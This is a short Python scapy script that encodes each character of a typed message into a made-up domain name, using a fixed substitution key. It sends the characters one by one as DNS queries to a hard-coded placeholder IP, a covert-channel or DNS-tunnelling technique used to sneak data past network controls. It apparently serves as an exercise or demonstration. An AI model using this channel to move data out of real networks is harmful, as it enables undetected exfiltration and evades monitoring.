from scapy.all import *
from scapy.layers.dns import DNS, DNSQR
from scapy.layers.inet import IP, UDP

ip = '0.0.0.0'

key = [
    '8?RCYAr>tXSv3LPaTbUyzqF7V9EdH10u',
    'SiGy1tj5MR:Ixrusv2YFN3P;H@J7Vm^K',
    'e2P[TQo9gR7K0_;?usa6NV:wIF5HXrdx',
    'uFZ3OsDXj<^lm@0:kBfc]zUEG;I6`LYW',
    'dwMpEz<krix4gY2s:H_Af57G8FRC@]>?',
    'f^8zPdX>n3:Yo\\7[B02hjs]H@aIQgpyi',
    'Y>e8jgItUbqhkQ@SrB5c7J=Od4RAuCpP'
]

mod = 32
keys_len = 7

def get_word(char):
    ascii_val = ord(char)
    word = ''
    for i in range(keys_len):
        word += key[i][(ascii_val // (i * (i % 2) + 1)) % mod]
    return word


def main():
    message = input('enter your message: ')
    for char in message:
        url = f'www.{get_word(char)}.com'
        print(get_word(char))
        send(IP(dst=ip) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=url, qtype="A")))


if __name__ == '__main__':
    main()
